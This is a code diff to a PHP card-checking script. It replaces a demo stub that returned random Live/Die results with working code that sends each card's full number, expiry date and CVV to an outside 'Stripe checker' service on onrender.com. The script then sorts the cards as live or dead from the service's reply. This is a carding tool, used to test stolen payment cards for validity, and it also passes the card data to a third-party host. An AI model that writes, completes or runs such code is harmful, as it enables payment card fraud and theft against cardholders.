@@ -318,19 +318,51 @@ if (!$validation['valid']) {
     exit;
 }
 
-// Card passed all validation checks
-// In a real application, you would integrate with a payment gateway here
-// For demo purposes, we simulate random results
-$rand = rand(1, 10);
+// Call external Stripe checker API
+$ccParam = urlencode($num . '|' . $expm . '|' . $expy . '|' . $cvv);
+$apiUrl = 'https://toenv-stripe-98-7.onrender.com/key=@OnyxEnvBot/cc=' . $ccParam;
 
-if ($rand <= 3) {
-    // 30% chance of Live
-    echo jsonResponse(1, "<div><b style='color:#10b981;'>Live</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | \$0.5 Charged - OshekharO</div>");
-} elseif ($rand <= 8) {
-    // 50% chance of Die
-    echo jsonResponse(2, "<div><b style='color:#ef4444;'>Die</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | Declined - OshekharO</div>");
+$ch = curl_init();
+curl_setopt_array($ch, [
+    CURLOPT_URL => $apiUrl,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 60,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => true,
+    CURLOPT_USERAGENT => 'MassChecker/1.0',
+]);
+
+$apiResponse = curl_exec($ch);
+$curlError = curl_error($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($apiResponse === false || $httpCode < 200 || $httpCode >= 300) {
+    $errMsg = $curlError ?: "HTTP {$httpCode}";
+    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | API Error: {$errMsg}</div>");
+    exit;
+}
+
+$apiData = json_decode($apiResponse, true);
+
+if ($apiData === null) {
+    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | Invalid API response</div>");
+    exit;
+}
+
+$status = isset($apiData['status']) ? strtolower(trim($apiData['status'])) : '';
+$responseMsg = isset($apiData['response']) ? $apiData['response'] : 'No response message';
+$gateway = isset($apiData['Gateway']) ? $apiData['Gateway'] : 'Stripe';
+
+// Classify result based on status
+$liveStatuses = ['approved', 'success', 'succeeded', 'charged', 'live', 'authenticated'];
+$dieStatuses = ['declined', 'rejected', 'failed', 'die', 'dead', 'insufficient_funds', 'do_not_honor', 'stolen_card', 'lost_card', 'expired_card', 'pickup_card'];
+
+if (in_array($status, $liveStatuses)) {
+    echo jsonResponse(1, "<div><b style='color:#10b981;'>Live</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | {$responseMsg}</div>");
+} elseif (in_array($status, $dieStatuses)) {
+    echo jsonResponse(2, "<div><b style='color:#ef4444;'>Die</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | {$responseMsg}</div>");
 } else {
-    // 20% chance of Unknown
-    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | Gateway timeout - OshekharO</div>");
+    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | [{$status}] {$responseMsg}</div>");
 }
 ?>
